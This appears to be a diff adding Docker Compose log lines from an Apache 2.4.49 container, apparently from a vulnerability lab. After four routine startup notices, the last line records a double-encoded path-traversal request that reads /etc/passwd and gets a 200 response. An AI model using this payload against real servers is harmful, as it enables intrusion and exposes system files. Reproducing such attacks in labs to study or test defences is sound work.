@@ -1,0 +1,5 @@
+apache-1  | AH00558: httpd: Could not reliably determine the server's fully qualified domain name, using 172.19.0.2. Set the 'ServerName' directive globally to suppress this message
+apache-1  | AH00558: httpd: Could not reliably determine the server's fully qualified domain name, using 172.19.0.2. Set the 'ServerName' directive globally to suppress this message
+apache-1  | [Mon Oct 19 06:43:01.378954 2026] [mpm_event:notice] [pid 1:tid 281472995382640] AH00489: Apache/2.4.49 (Unix) configured -- resuming normal operations
+apache-1  | [Mon Oct 19 06:43:01.379058 2026] [core:notice] [pid 1:tid 281472995382640] AH00094: Command line: 'httpd -D FOREGROUND'
+apache-1  | 172.19.0.1 - - [19/Oct/2026:06:43:03 +0000] "GET /icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd HTTP/1.1" 200 926
